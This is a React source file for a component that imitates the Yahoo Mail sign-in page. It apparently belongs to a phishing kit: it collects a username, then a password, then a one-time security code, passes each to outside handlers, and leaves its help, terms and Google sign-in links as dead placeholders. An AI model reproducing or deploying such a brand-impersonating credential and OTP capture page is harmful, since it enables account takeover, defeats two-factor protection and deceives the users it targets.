import React, { useState } from 'react';
import { ShieldCheck, Mail, Eye, EyeClosed } from 'lucide-react';
import './YahooLoginPage.css';
/* ─── Yahoo! purple wordmark logo ─────────────────────────────────── */
const YahooLogo = ({ className = '' }) => (
  <span className={`font-extrabold text-[#6001d2] tracking-tight ${className}`}>
    yahoo<span className="text-[#6001d2]">!</span>
  </span>
);

/* ─── Google G icon ───────────────────────────────────────────────── */
const GoogleIcon = () => (
  <svg width="18" height="18" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
    <g fill="none" fillRule="evenodd">
      <path d="M17.64 9.205c0-.639-.057-1.252-.164-1.841H9v3.481h4.844a4.14 4.14 0 01-1.796 2.716v2.259h2.908c1.702-1.567 2.684-3.875 2.684-6.615z" fill="#4285F4" />
      <path d="M9 18c2.43 0 4.467-.806 5.956-2.18l-2.908-2.259c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A8.997 8.997 0 009 18z" fill="#34A853" />
      <path d="M3.964 10.71A5.41 5.41 0 013.682 9c0-.593.102-1.17.282-1.71V4.958H.957A8.996 8.996 0 000 9c0 1.452.348 2.827.957 4.042l3.007-2.332z" fill="#FBBC05" />
      <path d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A8.997 8.997 0 00.957 4.958L3.964 6.29C4.672 4.163 6.656 3.58 9 3.58z" fill="#EA4335" />
    </g>
  </svg>
);

/* ─── Spinner ─────────────────────────────────────────────────────── */
const Spinner = () => (
  <svg className="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" />
  </svg>
);

/* ─── Component ───────────────────────────────────────────────────── */
export default function YahooLoginPage({
  email, password, otp, formStep,
  isSubmitting, emailError, pwWarning, otpError,
  onInputChange, onContinue, onPasswordSubmit, onOtpSubmit, onOtpChange,
  onBack, onClose, hint,
}) {
  const [showPassword, setShowPassword] = useState(false);
  return (
    <div className="yahoo-page min-h-screen w-screen bg-white flex flex-col font-sans text-[#1d1d1d]">

      {/* ── Navbar ── */}
      <nav className="hidden md:flex items-center justify-between px-6 md:px-10 py-4">
        <img src="yahoo.png" alt="Yahoo" className="w-auto h-9" />
        <div className="flex gap-4 text-sm text-[#6001d2] font-medium">
          <button onClick={onClose} className="hover:underline">Help</button>
          <a href="#" className="hover:underline">Terms</a>
          <a href="#" className="hover:underline">Privacy</a>
        </div>
      </nav>

      {/* ── Body ── */}
      <div className="flex-1 flex flex-col md:flex-row gap-8 md:gap-6 px-6 md:px-2 py-4 md:py-6 max-w-[1030px] mx-auto w-full">

        {/* Left — marketing copy (hidden on mobile) */}
        <div className="hidden md:block flex-1 py-[50px]">
          <h1 className="font-bold text-[#1d2228] mb-4 leading-snug text-[21px]">
            Yahoo makes it easy to enjoy what matters most in your world.
          </h1>
          <p className="text-[#1d2228] leading-tight text-[20px]">
            Best in class Yahoo Mail, breaking local, national and global news,
            finance, sports, music, movies and more. You get more out of the
            web, you get more out of life.
          </p>
        </div>

        {/* Right — login card */}
        <div className="w-full md:max-w-[380px] md:border md:border-gray-200 md:rounded-2xl px-4 md:px-9 py-4 md:py-8">

          {/* Step 1 — Username/Email */}
          {formStep === 1 && (
            <form onSubmit={onContinue} className="flex flex-col items-center">
              <img src="yahoo.png" alt="Yahoo" className="w-auto h-7 mb-12" />
              <h1 className="text-xl !font-extrabold text-[#1d2228] mb-1 text-center">Sign in to Yahoo Mail</h1>
              <p className="text-base text-[#555] mb-12 text-center">using your Yahoo account</p>

              <div className="w-full mb-1 relative">
                <label htmlFor="yahoo-email" className="absolute -top-2 left-0 text-sm text-[#1d1d1d] mb-1">Username, email, or mobile</label>
                {/* Envelope icon — visible only when input has content */}
                {email && (
                  <Mail
                    size={15}
                    className="absolute left-0 bottom-2.5 text-[#6001d2] pointer-events-none transition-all"
                  />
                )}
                <input
                  type="text"
                  name="email"
                  id="yahoo-email"
                  value={email}
                  onChange={onInputChange}
                  autoFocus
                  required
                  className={[
                    'w-full border-b pt-4 pb-2 text-sm outline-none transition-all duration-150 bg-transparent placeholder:text-[#999]',
                    email ? 'pl-5' : 'pl-0',
                    emailError ? 'border-red-500' : 'border-gray-400 focus:border-[#6001d2]',
                  ].join(' ')}
                />
                {emailError && <p className="text-xs text-red-600 mt-1">{emailError}</p>}
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-[#7d2eff] hover:bg-[#5200b3] disabled:opacity-60 text-white font-bold py-3 rounded-full text-sm transition mt-7 mb-4 flex justify-center items-center gap-2 cursor-pointer"
              >
                {isSubmitting ? <Spinner /> : 'Next'}
              </button>

              <div className="w-full flex justify-between items-center text-sm text-[#6001d2] mb-5">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input type="checkbox" defaultChecked className="accent-[#6001d2] w-4 h-4" />
                  <span className="text-[#6001d2] text-sm">Stay signed in</span>
                </label>
                <button className="text-sm hover:underline">Forgot username?</button>
              </div>

              <button
                type="button"
                className="w-full border border-[#7d2eff] text-[#7d2eff] hover:bg-[#f5edff] font-bold py-2.5 rounded-full text-sm transition mb-4 cursor-pointer"
              >
                Create an account
              </button>

              <p className="text-sm text-[#555] mb-4">or</p>

              <button
                type="button"
                className="w-full border border-gray-300 hover:bg-gray-50 text-[#1d1d1d] font-medium py-2.5 rounded-full text-sm transition flex items-center justify-center gap-2 cursor-pointer"
              >
                <GoogleIcon />
                Sign in with Google
              </button>
            </form>
          )}

          {/* Step 2 — Password */}
          {formStep === 2 && (
            <form onSubmit={onPasswordSubmit} className="flex flex-col items-center">
              <img src="yahoo.png" alt="Yahoo" className="w-auto h-7 mb-4" />

              <p className="text-md text-[#555] mb-4 text-center">{email}</p>

              <h1 className="text-2xl md:text-xl !font-extrabold text-[#1d2228] mb-1 text-center">Enter Password</h1>
              <p className="text-md text-[#555] mb-20 text-center">to finish sign in</p>

              <div className="w-full mb-1 relative">
                <label htmlFor="yahoo-password" className="absolute -top-2 left-0 text-sm text-[#1d1d1d] mb-1">Password</label>
                <input
                  type={showPassword ? 'text' : 'password'}
                  name="password"
                  id="yahoo-password"
                  value={password}
                  onChange={onInputChange}
                  autoFocus
                  required
                  className={[
                    'w-full border-b pb-2 pt-4 pr-8 text-sm outline-none transition-colors bg-transparent placeholder:text-[#999]',
                    pwWarning ? 'border-red-500' : 'border-gray-400 focus:border-[#6001d2]',
                  ].join(' ')}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(v => !v)}
                  className="absolute right-0 bottom-2 text-gray-500 hover:text-[#6001d2] transition-colors cursor-pointer"
                  aria-label={showPassword ? 'Hide password' : 'Show password'}
                >
                  {showPassword ? <Eye size={17} /> : <EyeClosed size={17} />}
                </button>
              </div>

              <div className="mb-5 text-left w-full">
                {pwWarning && <p className="text-xs text-red-600 mt-1">Incorrect password. Please try again.</p>}

                <button type="button" className="text-[#7d2eff] hover:underline cursor-pointer font-semibold text-sm">Forgot password?</button>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-[#6001d2] hover:bg-[#5200b3] disabled:opacity-60 text-white font-bold py-3 rounded-full text-sm transition mt-7 mb-4 flex justify-center items-center gap-2 cursor-pointer"
              >
                {isSubmitting ? <Spinner /> : 'Next'}
              </button>
            </form>
          )}

          {/* Step 3 — OTP */}
          {formStep === 3 && (
            <form onSubmit={onOtpSubmit} className="flex flex-col items-center">
              <img src="yahoo.png" alt="Yahoo" className="w-auto h-7 mb-4" />


              <div className="w-14 h-14 rounded-full bg-[#f5edff] flex items-center justify-center mb-5">
                <ShieldCheck size={28} className="text-[#6001d2]" strokeWidth={1.5} />
              </div>
              <h1 className="text-2xl md:text-xl font-extrabold text-[#1d1d1d] mb-2 text-center">Verify account</h1>
              <p className="text-sm text-[#555] mb-7 text-center">
                We sent a security code to your phone. Enter it below to continue.
              </p>

              <div className="w-full mb-1 relative">
                <label htmlFor="yahoo-otp" className="absolute -top-2 left-0 text-sm text-[#1d1d1d] mb-1">Enter code</label>
                <input
                  type="text"
                  id="yahoo-otp"
                  value={otp}
                  onChange={onOtpChange}
                  inputMode="numeric"
                  autoFocus
                  required
                  className={[
                    'w-full border-b pb-2 pt-4 text-sm outline-none tracking-widest transition-colors bg-transparent placeholder:text-[#999]',
                    otpError ? 'border-red-500' : 'border-gray-400 focus:border-[#6001d2]',
                  ].join(' ')}
                />
                {otpError && <p className="text-xs text-red-600 mt-1">{otpError}</p>}
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full bg-[#6001d2] hover:bg-[#5200b3] disabled:opacity-60 text-white font-bold py-3 rounded-full text-sm transition mt-7 mb-4 flex justify-center items-center gap-2 cursor-pointer"
              >
                {isSubmitting ? <Spinner /> : 'Verify'}
              </button>

              {/* <button
                type="button"
                onClick={onClose}
                className="text-xs text-[#6001d2] hover:underline cursor-pointer"
              >
                Cancel
              </button> */}
            </form>
          )}

        </div>
      </div>
    </div>
  );
}
